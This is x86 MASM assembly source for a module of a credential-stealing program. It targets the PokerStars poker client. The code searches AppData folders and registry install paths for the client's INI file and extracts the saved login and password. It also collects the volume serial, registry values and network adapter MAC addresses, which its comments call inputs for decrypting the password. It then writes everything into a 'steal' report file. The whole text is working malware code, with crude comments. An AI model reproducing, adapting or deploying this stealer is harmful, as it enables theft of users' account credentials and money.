
      MAX_LANA         equ 254
      
      LanaEnum struc
           len         db  ?
           lana        db  MAX_LANA dup (?)
      LanaEnum ends
      
      ASTAT struc
           adapt       db  60    dup (?)
           namebuf     db  30*18 dup (?)
      ASTAT ends
      

.data?
      ps_buf1          db  200h dup (?)
      ps_buf2          db  200h dup (?)
      ps_login         db  200h dup (?)
      ps_pwd           db  200h dup (?)
      ps_mac_buf1      db  100h dup (?)
      ps_reg_buf1      dd  ?
      ps_reg_buf2      dd  ?
      align 4
      ncb              NCB <>
      align 4
      Enum             LanaEnum <>
      align 4
      Adapter          ASTAT <>
      align 4
      mac_index        dd  ?
      MACs             db  1+(100*6) dup (?)
      align 4
      ps_tmp           dd  ?
      ps_tmp2          dd  ?
     
.code

GetPokerStarsPwd proc
      LOCAL   WTF:DWORD
      mov     dword ptr [DataSize], 0
      mov     dword ptr [stbuf], POKERSTARS_STEAL
      WriteFile, stfile, addr stbuf, sizeof stbuf, addr SNW, NULL
      
      push    offset stealer_seh_proc
      assume  fs : nothing
      push    dword ptr fs:[0]
      mov     dword ptr fs:[0], esp
      mov     eax, offset GetPokerStarsPwd_seh
      mov     seh.SafeEip, eax
      mov     seh.PrevEbp, ebp
      mov     seh.PrevEsp, esp
      SetFilePointer, stfile, 0, 0, FILE_CURRENT
      mov     dword ptr [savedfilepointer], eax
      
      call    GetPS_Shit
      
    GetPokerStarsPwd_seh:
      pop     dword ptr fs:[0]
      add     esp, 4
      
      WriteFile, stfile, addr DataSize, sizeof DataSize, addr SNW, NULL
      mov     eax, dword ptr [DataSize] ; return actual size of written data
      ret
GetPokerStarsPwd endp

GetPS_Shit proc uses ebx esi edi
      LOCAL   i:DWORD
      LOCAL   dwVolId:DWORD
      LOCAL   hPS_Total:DWORD
      LOCAL   total_index:DWORD
      
      ; 1. CSIDL_APPDATA
      mov     byte ptr [ps_buf1], 0
      push    0
      push    CSIDL_APPDATA
      push    offset ps_buf1
      push    0
      call    dword ptr [_SHGetSpecialFolderPath]
      push    offset ps_buf1
      call    dword ptr [_PathAddBackslash]
      lstrcat, addr ps_buf1, addr ps_path1
      push    offset ps_buf1
      call    ProcessPokerStarsINI
      test    eax, eax
      jnz     ps_found_some_shit
      ; 2. CSIDL_COMMON_APPDATA
      mov     byte ptr [ps_buf1], 0
      push    0
      push    CSIDL_COMMON_APPDATA
      push    offset ps_buf1
      push    0
      call    dword ptr [_SHGetSpecialFolderPath]
      push    offset ps_buf1
      call    dword ptr [_PathAddBackslash]
      lstrcat, addr ps_buf1, addr ps_path1
      push    offset ps_buf1
      call    ProcessPokerStarsINI
      test    eax, eax
      jnz     ps_found_some_shit
      ; 3. CSIDL_LOCAL_APPDATA
      mov     byte ptr [ps_buf1], 0
      push    0
      push    CSIDL_LOCAL_APPDATA
      push    offset ps_buf1
      push    0
      call    dword ptr [_SHGetSpecialFolderPath]
      push    offset ps_buf1
      call    dword ptr [_PathAddBackslash]
      lstrcat, addr ps_buf1, addr ps_path1
      push    offset ps_buf1
      call    ProcessPokerStarsINI
      test    eax, eax
      jnz     ps_found_some_shit
      ; 4. Install Location x2
      mov     i, 2
    ps_some_reg_shit_lp:
      .if     i == 2
              invoke  RegRead, HKEY_LOCAL_MACHINE, addr ps_reg_path1, addr ps_reg_val1, addr ps_buf1, sizeof ps_buf1, REG_READ_A
      .else  ;i == 1
              invoke  RegRead, HKEY_CURRENT_USER, addr ps_reg_path1, addr ps_reg_val1, addr ps_buf1, sizeof ps_buf1, REG_READ_A
      .endif
      .if     eax != 0
              lstrcpy, addr ps_buf2, addr ps_buf1
              ; smth was read
              mov     al, byte ptr [ps_buf1]
              .if     al == '"'
                      lstrcpy, addr ps_buf2, offset ps_buf1 + 1
              .endif
              lstrlen, addr ps_buf2
              mov     ecx, eax
              mov     esi, offset ps_buf2
              mov     edi, esi
            ps_kill_22h_lp:
              lodsb
              .if     al == 22h
                      xor     al, al
              .endif
              stosb
              dec     ecx
              jnz     ps_kill_22h_lp
              push    offset ps_buf2
              call    _PathFindFileName
              mov     byte ptr [eax], 0
              lstrcat, addr ps_buf2, addr ps_path2
              push    offset ps_buf2
              call    ProcessPokerStarsINI
              test    eax, eax
              jnz     ps_found_some_shit
      .endif
      dec     i
      jnz     ps_some_reg_shit_lp
      ; nothing found, we should gtfo
      jmp     ps_totally_no_data_in_this_bitch
    ps_found_some_shit:
      ; some important checks
      lstrlen, addr ps_login
      test    eax, eax
      je      ps_totally_no_data_in_this_bitch
      lstrlen, addr ps_pwd
      test    eax, eax
      je      ps_totally_no_data_in_this_bitch
      ; DO SOME SYSINFO COLLECTING SHIT FOR TEH DECRYPT
      GetWindowsDirectory, addr ps_buf2, sizeof ps_buf2
      mov     byte ptr [ps_buf2+3], 0
      GetVolumeInformation, addr ps_buf2, 0, 0, addr dwVolId, 0, 0, 0, 0
      invoke  RegRead, HKEY_CURRENT_USER, addr ps_reg_path2, addr ps_sysinfo_val1, addr ps_reg_buf1, sizeof ps_reg_buf1, REG_READ_A
      test    eax, eax
      je      ps_totally_no_data_in_this_bitch
      invoke  RegRead, HKEY_CURRENT_USER, addr ps_reg_path2, addr ps_sysinfo_val2, addr ps_reg_buf2, sizeof ps_reg_buf2, REG_READ_A
      test    eax, eax
      je      ps_totally_no_data_in_this_bitch
      ; And finally - MAC addr shit
      push    sizeof ps_mac_buf1
      push    offset ps_mac_buf1
      call    GetMacAddr
      test    eax, eax
      je      ps_totally_no_data_in_this_bitch
      ; now we can write this bitch down to report, biatch!
      ; calc total size
      movzx   ebx, byte ptr [MACs]
      imul    ebx, ebx, 6
      inc     ebx
      lstrlen, addr ps_login
      add     ebx, eax
      inc     ebx
      lstrlen, addr ps_pwd
      add     ebx, eax
      inc     ebx
      add     ebx, (3*4) + (2*4) ; 2 intances + 1 VolId    +    len(login) + len(pwd)
      mov     ps_tmp, ebx
      ; alloc mem
      HeapAlloc, hHeap, HEAP_ZERO_MEMORY, ps_tmp
      test    eax, eax
      je      ps_totally_no_data_in_this_bitch
      mov     hPS_Total, eax
      mov     total_index, eax
      ; move some shit here and there
      movzx   ecx, byte ptr [MACs]
      imul    ecx, ecx, 6
      inc     ecx
      add     total_index, ecx
      RtlMoveMemory, hPS_Total, addr MACs, ecx
      lstrlen, addr ps_login
      mov     ps_tmp2, eax
      RtlMoveMemory, total_index, addr ps_tmp2, sizeof ps_tmp2
      add     total_index, sizeof ps_tmp2
      lstrcpy, total_index, addr ps_login
      lstrlen, addr ps_login
      add     total_index, eax
      lstrlen, addr ps_pwd
      mov     ps_tmp2, eax
      RtlMoveMemory, total_index, addr ps_tmp2, sizeof ps_tmp2
      add     total_index, sizeof ps_tmp2
      lstrcpy, total_index, addr ps_pwd
      lstrlen, addr ps_pwd
      add     total_index, eax
      RtlMoveMemory, total_index, addr ps_reg_buf1, sizeof ps_reg_buf1
      add     total_index, sizeof ps_reg_buf1
      RtlMoveMemory, total_index, addr ps_reg_buf2, sizeof ps_reg_buf2
      add     total_index, sizeof ps_reg_buf2
      RtlMoveMemory, total_index, addr dwVolId, sizeof dwVolId
      
      add     dword ptr [DataSize], sizeof ps_tmp
      WriteFile, stfile, addr ps_tmp, sizeof ps_tmp, addr SNW, NULL
      mov     eax, dword ptr [ps_tmp]
      add     dword ptr [DataSize], eax
      WriteFile, stfile, hPS_Total, ps_tmp, addr SNW, NULL
      
      ; free this bitch out!
      HeapFree, hHeap, 0, hPS_Total
    ps_totally_no_data_in_this_bitch:
      ret
GetPS_Shit endp

GetMacAddr proc uses ebx edi pmem:DWORD, pmemsize:DWORD
      LOCAL   RESULT:DWORD
      mov     RESULT, 0
      ; some init
      RtlZeroMemory, pmem, pmemsize
      mov     mac_index, offset MACs
      ; first shit
      RtlZeroMemory, addr ncb, sizeof ncb
      mov     ncb.ncb_command, NCBENUM
      mov     ncb.ncb_buffer, offset Enum
      mov     ncb.ncb_length, sizeof Enum
      push    offset ncb
      call    _Netbios
      .if     ax == NRC_GOODRET
              movzx   ecx, byte ptr [Enum.len]
              mov     eax, dword ptr [mac_index]
              mov     byte ptr [eax], cl
              add     mac_index, 1
              mov     RESULT, ecx
              mov     ebx, offset Enum.lana
            enum_netcardz_lp:
              push    ecx
              RtlZeroMemory, addr ncb, sizeof ncb
              mov     ncb.ncb_command, NCBRESET
              mov     al, byte ptr [ebx]
              mov     ncb.ncb_lana_num, al
              push    offset ncb
              call    _Netbios
              .if     ax == NRC_GOODRET
                      RtlZeroMemory, addr ncb, sizeof ncb
                      mov     ncb.ncb_command, NCBASTAT
                      mov     al, byte ptr [ebx]
                      mov     ncb.ncb_lana_num, al
                      mov     edi, offset ncb.ncb_callname
                      mov     ecx, sizeof ncb.ncb_callname
                      mov     al, ' '
                      cld
                      rep     stosb
                      mov     byte ptr [ncb.ncb_callname], 2Ah
                      mov     ncb.ncb_buffer, offset Adapter
                      mov     ncb.ncb_length, sizeof Adapter
                      push    offset ncb
                      call    _Netbios
                      .if     ax == NRC_GOODRET
                              RtlMoveMemory, mac_index, addr Adapter.adapt, 6
                              add     mac_index, 6
                      .endif
              .endif
              inc     ebx
              pop     ecx
              dec     ecx
              jnz     enum_netcardz_lp
      .endif
      mov     eax, RESULT
      ret
GetMacAddr endp

ProcessPokerStarsINI proc pfile:DWORD
      LOCAL   RESULT:DWORD
      
      mov     RESULT, 0
      GetPrivateProfileString, addr ps_ini_razdel, addr ps_ini_login, 0, addr ps_login, sizeof ps_login, pfile
      test    eax, eax
      je      ps_no_data_here
      
      GetPrivateProfileString, addr ps_ini_razdel, addr ps_ini_pwd, 0, addr ps_pwd, sizeof ps_pwd, pfile
      test    eax, eax
      je      ps_no_data_here
      
      mov     RESULT, 1
      
    ps_no_data_here:
      mov     eax, RESULT
      ret
ProcessPokerStarsINI endp
